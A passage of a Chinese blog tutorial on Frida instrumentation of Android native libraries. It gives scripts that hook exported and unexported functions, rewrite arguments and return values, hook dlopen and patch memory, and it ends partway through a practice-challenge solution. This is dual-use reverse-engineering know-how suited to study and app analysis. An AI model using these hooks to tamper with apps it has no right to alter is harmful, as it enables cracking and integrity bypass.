string\">\"Java_com_zyc_fridasodemo_Calc_addThreeNum\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        Interceptor<span class=\"token punctuation\">.</span><span class=\"token function\">attach</span><span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">onEnter</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">args</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"onEnter...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"args[0]:\"</span><span class=\"token punctuation\">,</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"args[1]:\"</span><span class=\"token punctuation\">,</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"args[2]：\"</span><span class=\"token punctuation\">,</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"args[3]：\"</span><span class=\"token punctuation\">,</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"args[4]：\"</span><span class=\"token punctuation\">,</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token function\">onLeave</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">retval</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> \n                console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"onLeave...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"retval:\"</span><span class=\"token punctuation\">,</span>retval<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 函数返回值</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"修改native层的参数\"><a href=\"#修改native层的参数\" class=\"headerlink\" title=\"修改native层的参数\"></a>修改native层的参数</h3><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// 修改native层的内容</span>\n<span class=\"token comment\">// 根据上面获取的 args 我们可以修改参数，但注意参数得是 NativePointer，直接用 “=” 赋值会报错“expected a pointer”</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">hookParam</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">const</span> address <span class=\"token operator\">=</span> Module<span class=\"token punctuation\">.</span><span class=\"token function\">findExportByName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"libnative-lib.so\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Java_com_zyc_fridasodemo_Calc_addThreeNum\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        Interceptor<span class=\"token punctuation\">.</span><span class=\"token function\">attach</span><span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">onEnter</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">args</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                args<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">ptr</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 写成 args[2]=1000 会报错</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token function\">onLeave</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">retval</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"修改native层函数的返回值\"><a href=\"#修改native层函数的返回值\" class=\"headerlink\" title=\"修改native层函数的返回值\"></a>修改native层函数的返回值</h3><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">function</span> <span class=\"token function\">hookReturn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">const</span> address <span class=\"token operator\">=</span> Module<span class=\"token punctuation\">.</span><span class=\"token function\">findExportByName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"libnative-lib.so\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Java_com_zyc_fridasodemo_Calc_addThreeNum\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        Interceptor<span class=\"token punctuation\">.</span><span class=\"token function\">attach</span><span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">onEnter</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">args</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token function\">onLeave</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">retval</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                retval<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//用 replace() 不要用 =</span>\n                console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"retval:\"</span><span class=\"token punctuation\">,</span>retval<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token comment\">// 如果返回值是jstring，得用下面方式替换</span>\n               <span class=\"token comment\">//var env = Java.vm.getEnv(); //获取env对象，即第一个参数</span>\n               <span class=\"token comment\">//var jstrings = env.newStringUtf(\"xxxx\"); //返回的是字符串指针，使用jni函数构造一个newStringUtf对象用来代替这个指针</span>\n               <span class=\"token comment\">//retval.replace(jstrings); </span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Hook未导出的函数\"><a href=\"#Hook未导出的函数\" class=\"headerlink\" title=\"Hook未导出的函数\"></a>Hook未导出的函数</h3><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">function</span> <span class=\"token function\">hookDynamic</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">const</span> soAddress <span class=\"token operator\">=</span> Module<span class=\"token punctuation\">.</span><span class=\"token function\">findBaseAddress</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"libnative-lib.so\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"so基址：\"</span> <span class=\"token operator\">+</span> soAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>soAddress<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">const</span> methodAddress <span class=\"token operator\">=</span> soAddress<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x0690</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// thrumb指令集要+1</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>methodAddress<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"函数地址：\"</span> <span class=\"token operator\">+</span> methodAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            Interceptor<span class=\"token punctuation\">.</span><span class=\"token function\">attach</span><span class=\"token punctuation\">(</span>methodAddress<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token function\">onEnter</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">args</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hook动态注册函数的参数：\"</span> <span class=\"token operator\">+</span> Java<span class=\"token punctuation\">.</span>vm<span class=\"token punctuation\">.</span><span class=\"token function\">getEnv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStringUtfChars</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">readCString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//打印jstring要用getStringUtfChars</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token function\">onLeave</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">retval</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hook动态注册函数的返回值：\"</span> <span class=\"token operator\">+</span> Java<span class=\"token punctuation\">.</span>vm<span class=\"token punctuation\">.</span><span class=\"token function\">getEnv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStringUtfChars</span><span class=\"token punctuation\">(</span>retval<span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">readCString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Hook-so加载（dlopen）\"><a href=\"#Hook-so加载（dlopen）\" class=\"headerlink\" title=\"Hook so加载（dlopen）\"></a>Hook so加载（dlopen）</h3><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// 当遇到“等so加载完后进行某Hook操作时”，可以Hook dlopen（有的是android_dlopen_ext）方法来确定so的加载。PS：不推荐Hook System.loadLibrary()，因为加载so的方式并不止这一种，而且最终都会调用 dlopen()</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">hookDlopen</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> dlopenAddr <span class=\"token operator\">=</span> Module<span class=\"token punctuation\">.</span><span class=\"token function\">findExportByName</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"dlopen\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>dlopenAddr<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        Interceptor<span class=\"token punctuation\">.</span><span class=\"token function\">attach</span><span class=\"token punctuation\">(</span>dlopenAddr<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">onEnter</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">args</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// dlopen(const char* filename, int flags)</span>\n                <span class=\"token keyword\">let</span> soName <span class=\"token operator\">=</span> args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">readCString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"/data/app/com.zyc.fridasodemo-1/lib/x86/libnative-lib.so\"</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>soName<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"libnative-lib.so\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"成功加载到了--&gt;\"</span> <span class=\"token operator\">+</span> soName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>hasloaded <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token function\">onLeave</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">retval</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">//onLeave()中才是dlopen()加载完成后</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>hasloaded<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token function\">hooImEx</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 等so加载完成就执行导入/导出函数打印</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"读写内存\"><a href=\"#读写内存\" class=\"headerlink\" title=\"读写内存\"></a>读写内存</h3><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">function</span> <span class=\"token function\">hookMem</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">const</span> soAddress <span class=\"token operator\">=</span> Module<span class=\"token punctuation\">.</span><span class=\"token function\">findBaseAddress</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"libnative-lib.so\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"so基址：\"</span> <span class=\"token operator\">+</span> soAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>soAddress<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"读取...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">const</span> strAddress <span class=\"token operator\">=</span> soAddress<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x028334</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"打印这段字符串：\"</span> <span class=\"token operator\">+</span> strAddress<span class=\"token punctuation\">.</span><span class=\"token function\">readCString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"读16字节：\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>strAddress<span class=\"token punctuation\">.</span><span class=\"token function\">readByteArray</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"写入...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            Memory<span class=\"token punctuation\">.</span><span class=\"token function\">protect</span><span class=\"token punctuation\">(</span>strAddress<span class=\"token punctuation\">,</span> Process<span class=\"token punctuation\">.</span>pageSize<span class=\"token punctuation\">,</span> <span class=\"token string\">\"rw-\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//修改内存页属性后再写入，不然可能报access violation accessing</span>\n            strAddress<span class=\"token punctuation\">.</span><span class=\"token function\">writeUtf8String</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello from PHP\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">//内存写入字符串,该方法末尾会自动添加'\\0'</span>\n            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\r\\n打印这段字符串：\"</span> <span class=\"token operator\">+</span> strAddress<span class=\"token punctuation\">.</span><span class=\"token function\">readCString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"读16字节：\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>strAddress<span class=\"token punctuation\">.</span><span class=\"token function\">readByteArray</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"一个例子\"><a href=\"#一个例子\" class=\"headerlink\" title=\"一个例子\"></a>一个例子</h3><h4 id=\"题目描述\"><a href=\"#题目描述\" class=\"headerlink\" title=\"题目描述\"></a>题目描述</h4><p>很简单的一个app，打开会显示Hello from C++，题目的要求是修改该字符串为任意值。看起来挺容易</p>\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/image-20231004222425282.png\" alt=\"image-20231004222425282\"></p>\n<p>使用jeb逆向看一下MainActivity的逻辑：字符串生成函数来自native层的stringFromJNI，这里的第一想法是使用frida 在native做hook。<br><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/image-20231004222542793.png\" alt=\"image-20231004222542793\"></p>\n<p>导出libnative-lib.so文件，IDA pro 7.5还是蛮强大的，老版本的IDA是不认识JNI函数的。在export找到对应的函数：</p>\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/image-20231004222937267.png\" alt=\"image-20231004222937267\"></p>\n<p>逻辑很简单</p>\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/image-20231004222953301.png\" alt=\"image-20231004222953301\"></p>\n<p>第一次使用的脚本如下：</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">function</span> <span class=\"token function\">hookByName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">const</span> address <span class=\"token operator\">=</span> Module<span class=\"token punctuation\">.</span><span class=\"token function\">findExportByName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"libnative-lib.so\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"Java_com_example_x86demo_MainActivity_stringFromJNI\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            Interceptor<span class=\"token punctuation\">.</span><span class=\"token function\">attach</span><span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token function\">onEnter</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">args</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"onEnter...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token function\">onLeave</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">retval</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> \n                    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"onLeave...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">var</span> env <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span>vm<span class=\"token punctuation\">.</span><span class=\"token function\">getEnv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">var</span> jstrings <span class=\"token operator\">=</span> env<span class=\"token punctuation\">.</span><span class=\"token function\">newStringUtf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hacked!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    retval<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>jstrings<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"retval:\"</span><span class=\"token punctuation\">,</span>retval<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 函数返回值</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"NOT FOUND!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>​\t但是frida一直是NOT FOUND，这是因为frida要重启APP去执行该脚本，在onCreate函数执行前libnative-lib.so还没有加载，因此在程序内存中是找不到该so文件的。因此有两种方法，一种是使用dlopen手动加载该so，但是程序直接崩溃了。。。。</p>\n<p>​\t另一种方法是hook onCreate函数，在onCreate函数执行之前执行native的hook，当然这里so文件已经加载进内存了，stringFromJNI中的字符串是硬编码存储，也可以直接修改内存。要注意以下几点：</p>\n<ul>\n<li><strong>hook native</strong><ul>\n<li>在对native函数进行hook的时候要使用函数的全名。打开IDA后Export显示的名称</li>\n<li>修改返回值时，如果返回值是string，不能简单的replace（具体方式看下面脚本）</li>\n</ul>\n</li>\n<li><strong>修改内存</strong><ul>\n<li>修改内存先找so基址，偏移量将IDA segment中的base addr设为0后，显示的地址加so基址即可</li>\n<li>写内容时先修改内存页的保护属性</li>\n</ul>\n</li>\n</ul>\n<p>具体脚本如下：</p>\n<h4 id=\"解题脚本\"><a href=\"#解题脚本\" class=\"headerlink\" title=\"解题脚本\"></a>解题脚本</h4><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">Java<span class=\"token punctuation\">.</span><span class=\"token function\">perform</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">hookMem</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">const</span> soAddress <span class=\"token operator\">=</span> Module<span class=\"token punctuation\">.</span><span class=\"token function\">findBaseAddress</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"libnative-lib.so\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"so基址：\"</span> <span class=\"token operator\">+</span> soAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>soAddress<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"读取...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">const</span> strAddress <span class=\"token operator\">=</span> soAddress<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x028334</span><span class=\"token 